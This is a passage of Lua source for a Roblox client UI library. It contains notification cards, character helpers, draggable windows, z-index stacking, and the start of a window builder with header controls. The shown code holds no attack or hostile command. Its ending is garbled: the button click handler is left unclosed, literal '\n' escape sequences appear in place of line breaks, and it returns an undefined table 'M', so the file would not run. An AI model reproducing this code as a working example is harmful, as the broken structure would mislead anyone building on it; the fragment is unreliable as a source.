    NotifyHolder.Position = UDim2.new(1, -336, 0, 20)
    NotifyHolder.BackgroundTransparency = 1
    NotifyHolder.Parent = parent
    local lay = Instance.new("UIListLayout")
    lay.Padding = UDim.new(0, 8)
    lay.SortOrder = Enum.SortOrder.LayoutOrder
    lay.HorizontalAlignment = Enum.HorizontalAlignment.Right
    lay.VerticalAlignment = Enum.VerticalAlignment.Bottom
    lay.Parent = NotifyHolder
    return NotifyHolder
end

local function notify(title, text, duration, color)
    duration = duration or 3.5
    color = color or Theme.Accent
    pcall(function()
        StarterGui:SetCore("SendNotification", {
            Title = tostring(title),
            Text = tostring(text),
            Duration = duration,
        })
    end)
    if not NotifyHolder then return end
    local card = Instance.new("Frame")
    card.Name = "Notify"
    card.Size = UDim2.new(1, 0, 0, 0)
    card.AutomaticSize = Enum.AutomaticSize.Y
    card.BackgroundColor3 = Theme.BackgroundDark
    card.BackgroundTransparency = 0.05
    card.BorderSizePixel = 0
    card.Parent = NotifyHolder
    corner(card, Theme.Rounded)
    stroke(card, color, 0, 0)
    local accentBar = Instance.new("Frame")
    accentBar.Size = UDim2.new(0, 4, 1, 0)
    accentBar.BackgroundColor3 = color
    accentBar.BorderSizePixel = 0
    accentBar.Parent = card
    corner(accentBar, UDim.new(0, 2))
    local tb = Instance.new("TextLabel")
    tb.BackgroundTransparency = 1
    tb.Position = UDim2.new(0, 14, 0, 8)
    tb.Size = UDim2.new(1, -22, 0, 16)
    tb.Font = Theme.FontBold
    tb.TextSize = 13
    tb.TextColor3 = Theme.Text
    tb.TextXAlignment = Enum.TextXAlignment.Left
    tb.Text = tostring(title)
    tb.Parent = card
    local tx = Instance.new("TextLabel")
    tx.BackgroundTransparency = 1
    tx.Position = UDim2.new(0, 14, 0, 26)
    tx.Size = UDim2.new(1, -22, 0, 14)
    tx.AutomaticSize = Enum.AutomaticSize.Y
    tx.Font = Theme.Font
    tx.TextSize = 12
    tx.TextColor3 = Theme.TextDim
    tx.TextXAlignment = Enum.TextXAlignment.Left
    tx.TextWrapped = true
    tx.Text = tostring(text)
    tx.Parent = card
    local inT = tween(card, 0.25, { BackgroundTransparency = 0.05 })
    task.delay(duration, function()
        local out = tween(card, 0.3, { BackgroundTransparency = 1 })
        tween(tb, 0.3, { TextTransparency = 1 })
        tween(tx, 0.3, { TextTransparency = 1 })
        tween(accentBar, 0.3, { BackgroundTransparency = 1 })
        out.Completed:Wait()
        card:Destroy()
    end)
end

--==============================================================================
--// CHARACTER / ROOT HELPERS
--==============================================================================
local function getChar()
    return LocalPlayer.Character
end
local function getRoot()
    local c = getChar()
    return c and (c:FindFirstChild("HumanoidRootPart") or c:FindFirstChild("Torso") or c:FindFirstChild("UpperTorso"))
end
local function getHum()
    local c = getChar()
    return c and c:FindFirstChildOfClass("Humanoid")
end
local function getHRP(char)
    char = char or getChar()
    return char and (char:FindFirstChild("HumanoidRootPart") or char:FindFirstChild("Torso") or char:FindFirstChild("UpperTorso"))
end
local function isAlive(plr)
    if not plr then plr = LocalPlayer end
    local c = plr.Character
    local h = c and c:FindFirstChildOfClass("Humanoid")
    return c ~= nil and h ~= nil and h.Health > 0
end

--==============================================================================
--// DRAGGING UTILITY  (works on PC + mobile)
--==============================================================================
local function makeDraggable(frame, handle)
    handle = handle or frame
    local dragging = false
    local dragInput, mousePos, framePos
    handle.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseButton1
        or input.UserInputType == Enum.UserInputType.Touch then
            dragging = true
            mousePos = input.Position
            framePos = frame.Position
            input.Changed:Connect(function()
                if input.UserInputState == Enum.UserInputState.End then
                    dragging = false
                end
            end)
        end
    end)
    handle.InputChanged:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.MouseMovement
        or input.UserInputType == Enum.UserInputType.Touch then
            dragInput = input
        end
    end)
    UserInputService.InputChanged:Connect(function(input)
        if input == dragInput and dragging then
            local delta = input.Position - mousePos
            frame.Position = UDim2.new(
                framePos.X.Scale, math.clamp(framePos.X.Offset + delta.X, -frame.AbsoluteSize.X + 60, Workspace.CurrentCamera.ViewportSize.X - 60),
                framePos.Y.Scale, math.clamp(framePos.Y.Offset + delta.Y, 0, Workspace.CurrentCamera.ViewportSize.Y - 40)
            )
        end
    end)
end

--==============================================================================
--// Z-INDEX / WINDOW STACK MANAGEMENT
--==============================================================================
local TopZ = 10
local function bringToFront(frame)
    TopZ = TopZ + 1
    frame.ZIndex = TopZ
    for _, d in ipairs(frame:GetDescendants()) do
        if d:IsA("GuiObject") then
            d.ZIndex = TopZ + (d.ZIndex - 10)
        end
    end
end

--==============================================================================
--// CORE UI LIBRARY  (window + elements)
--==============================================================================
local OpenWindows = {}

local function createWindow(title, subtitle, sizeX, sizeY, pos)
    local self = {}
    self._destroyed = false
    self._elements = {}
    self._keybinds = {}

    local root = Instance.new("Frame")
    root.Name = "Window_" .. tostring(title)
    root.Size = UDim2.new(0, sizeX or 470, 0, sizeY or 460)
    root.Position = pos or UDim2.new(0.5, -(sizeX or 470)/2, 0.5, -(sizeY or 460)/2)
    root.BackgroundColor3 = Theme.Background
    root.BorderSizePixel = 0
    root.ZIndex = 10
    root.Parent = ScreenGui
    corner(root, Theme.RoundedBig)
    stroke(root, Theme.Stroke, 1, 0.2)

    -- shadow-ish top accent
    local accentLine = Instance.new("Frame")
    accentLine.Name = "Accent"
    accentLine.Size = UDim2.new(1, 0, 0, 3)
    accentLine.BackgroundColor3 = Theme.Accent
    accentLine.BorderSizePixel = 0
    accentLine.ZIndex = 11
    accentLine.Parent = root
    gradient(accentLine, Theme.AccentBright, Theme.AccentDark, 0)
    local aCorner1 = Instance.new("UICorner"); aCorner1.CornerRadius = Theme.RoundedBig; aCorner1.Parent = accentLine

    -- HEADER
    local header = Instance.new("Frame")
    header.Name = "Header"
    header.Size = UDim2.new(1, 0, 0, 44)
    header.BackgroundColor3 = Theme.Sidebar
    header.BorderSizePixel = 0
    header.ZIndex = 11
    header.Parent = root
    corner(header, Theme.RoundedBig)
    local hFill = Instance.new("Frame"); hFill.Size = UDim2.new(1,0,0,22); hFill.BackgroundColor3 = Theme.Sidebar; hFill.BorderSizePixel = 0; hFill.ZIndex = 11; hFill.Position = UDim2.new(0,0,0,22); hFill.Parent = header

    local titleLbl = Instance.new("TextLabel")
    titleLbl.BackgroundTransparency = 1
    titleLbl.Position = UDim2.new(0, 16, 0, 6)
    titleLbl.Size = UDim2.new(1, -120, 0, 20)
    titleLbl.Font = Theme.FontBold
    titleLbl.TextSize = 15
    titleLbl.TextColor3 = Theme.Text
    titleLbl.TextXAlignment = Enum.TextXAlignment.Left
    titleLbl.Text = title or "Window"
    titleLbl.ZIndex = 12
    titleLbl.Parent = header

    local subLbl = Instance.new("TextLabel")
    subLbl.BackgroundTransparency = 1
    subLbl.Position = UDim2.new(0, 16, 0, 25)
    subLbl.Size = UDim2.new(1, -120, 0, 14)
    subLbl.Font = Theme.Font
    subLbl.TextSize = 11
    subLbl.TextColor3 = Theme.TextDim
    subLbl.TextXAlignment = Enum.TextXAlignment.Left
    subLbl.Text = subtitle or "Feature window"
    subLbl.ZIndex = 12
    subLbl.Parent = header

    -- window control buttons
    local function makeCtrl(text, color, offsetX, onClick)
        local btn = Instance.new("TextButton")
        btn.Size = UDim2.new(0, 26, 0, 26)
        btn.Position = UDim2.new(1, offsetX, 0.5, -13)
        btn.BackgroundColor3 = Theme.Element
        btn.Text = text
        btn.Font = Theme.FontBold
        btn.TextSize = 14
        btn.TextColor3 = color or Theme.Text
        btn.AutoButtonColor = true
        btn.BorderSizePixel = 0
        btn.ZIndex = 12
        btn.Parent = header
        corner(btn, UDim.new(0, 6))
        btn.MouseButton1Click:Connect(function()
            tween(btn, 0.1, { BackgroundColor3 = Theme.ElementHover })
            task.wait(0.1)
            tween(btn, 0.1, { BackgroundColor3 = Theme.Element })
            onClick()
        end\n    end\nend\n\nreturn M\n
